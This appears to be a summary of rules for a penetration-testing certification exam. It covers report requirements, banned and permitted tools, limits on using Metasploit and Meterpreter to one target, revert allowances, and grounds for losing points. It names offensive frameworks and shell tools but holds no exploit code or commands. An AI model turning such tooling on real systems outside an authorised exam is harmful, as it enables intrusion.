Windows full points require a shell as **SYSTEM**, **Administrator**, or a user with Administrator privileges. Linux full points require **root**.
A professional report covering every attack: all steps, commands issued, and console output — detailed enough for a competent reader to replicate it.
**Once submitted, the submission is final.** Missing screenshots cannot be added later.
**Unmodified exploit:** give the URL only; do not paste pages of third-party code.
**Modified exploit:** include the modified code, the original URL, the shellcode-generation command (if any), highlighted changes, and why you changed them.
Suggested templates: the official Word or OpenOffice report template (or your own, if structured and professional).

blocks.text: Not permitted

items: **Spoofing** — IP, ARP, DNS, NBNS, etc.
**Commercial tools or services** — Metasploit Pro, Burp Pro, etc.
**Automatic exploitation tools** — db\_autopwn, browser\_autopwn, **SQLmap**, SQLninja, etc.
**Mass vulnerability scanners** — Nessus, NeXpose, OpenVAS, Canvas, Core Impact, SAINT, etc.
**AI chatbots** — OffSec KAI, ChatGPT, YouChat, DeepSeek, Gemini, etc. Using LLMs is treated as receiving third-party help.
Features inside otherwise-allowed tools that perform any of the above.

blocks.text: Permitted (examples named in the guide)

items: **Nmap** (including its scripting engine), **Nikto**, **Burp Free**, **DirBuster**, and similar manual tools.
Tools with built-in AI features (e.g. Notion, Google AI Overview) do **not** need to be disabled — but you may not use the AI features to solve exam tasks.
Discord may be used to **search for information**, but never to request or receive help.

blocks.text: You are responsible for knowing what a tool does under the hood. "A tool did it automatically" is not a defence.

items: Metasploit modules (**Auxiliary, Exploit, Post**) or **Meterpreter** may be used against **one** target machine only — your choice, locked in from the first use.
You may **not** use `check` (or modules) against several machines to pick a target. Testing multiple machines with Metasploit selects your one machine by that act.
If the attempt on your chosen machine **fails**, you may **not** move Metasploit to a second machine.
Metasploit **cannot be used for pivoting** (that would touch more than one target).
`multi/handler` and `msfvenom` may be used against **all** machines — but a Meterpreter payload still counts as Meterpreter and is limited to one machine.
The same limits apply to Armitage, Cobalt Strike, Metasploit Community Edition, and similar interfaces.
**24 reverts**, and the limit can be **reset once** during the exam.
All machines start freshly reverted.
Click **once** per attempt and wait — a revert discards all your changes on that machine.

blocks.text: No points for a machine if you:

items: used a restricted tool;
used Metasploit Auxiliary/Exploit/Post or Meterpreter on more than one machine;
failed to provide `local.txt`/`proof.txt` in **both** the control panel and an interactive-shell screenshot;
did not document the work.
